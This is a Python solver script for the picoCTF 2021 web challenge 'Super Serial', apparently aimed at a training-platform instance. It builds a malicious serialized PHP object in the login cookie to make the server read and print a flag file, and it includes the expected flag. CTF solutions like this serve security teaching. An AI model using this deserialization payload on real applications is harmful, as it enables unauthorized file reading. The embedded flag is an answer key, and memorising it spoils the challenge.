#!/usr/bin/env python3
"""Solver for Challenge 180 Super Serial (picoCTF 2021, Web Exploitation).

PHP object-injection via the `login` cookie (stdlib only, no login needed):
  - index.php sets `login = urlencode(base64(serialize(permissions)))` after
    a SQLite credential check, but cookie.php unserializes that cookie on
    EVERY page (index.php and authentication.php) before any auth check.
  - cookie.php: `$perm->is_guest()` on the unserialized object. Supplying a
    foreign class (`access_log` from authentication.php) raises Error
    (undefined method), caught by `catch(Error)` which evaluates
    `die("Deserialization error. " . $perm)` -- string concatenation invokes
    `access_log::__toString()` -> `read_log()` -> `file_get_contents()`.
  - So a cookie of `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
    makes the server read `../flag` and print it inside the catch message.
  - Note: index.php cannot render the flag (its require_once path fatals on
    __PHP_Incomplete_Class before the catch), use /authentication.php.
  - The live instance's ../users.db is missing (login always fatals), which
    makes the cookieless direct-injection path the only working route.

Usage: solve_180_super_serial.py [host] [port]
Verified: academy{1_c4nn0t_s33_y0u_cf804c42} (POST /api/submissions/ -> correct:true)
"""
import base64
import re
import socket
import sys
import urllib.parse

HOST = "xebec.cylabacademy.net"
PORT = 25954
EXPECTED = "academy{1_c4nn0t_s33_y0u_cf804c42}"
FLAG_RE = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")


def build_cookie(log_file="../flag"):
    raw = 'O:10:"access_log":1:{s:8:"log_file";s:%d:"%s";}' % (len(log_file), log_file)
    return "login=" + urllib.parse.quote(base64.b64encode(raw.encode()).decode())


def fetch(host, port, path, cookie):
    s = socket.create_connection((host, int(port)), timeout=15)
    try:
        req = ("GET %s HTTP/1.0\r\nHost: x\r\nUser-Agent: Mozilla/5.0\r\n"
               "Cookie: %s\r\n\r\n" % (path, cookie))
        s.sendall(req.encode())
        data = b""
        while True:
            ch = s.recv(8192)
            if not ch:
                break
            data += ch
    finally:
        s.close()
    _, _, body = data.partition(b"\r\n\r\n")
    return body.decode(errors="replace")


def solve(host=HOST, port=PORT):
    body = fetch(host, port, "/authentication.php", build_cookie())
    m = FLAG_RE.search(body)
    if not m:
        raise RuntimeError("flag not found: " + body[:300])
    return m.group(0)


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(host, port))
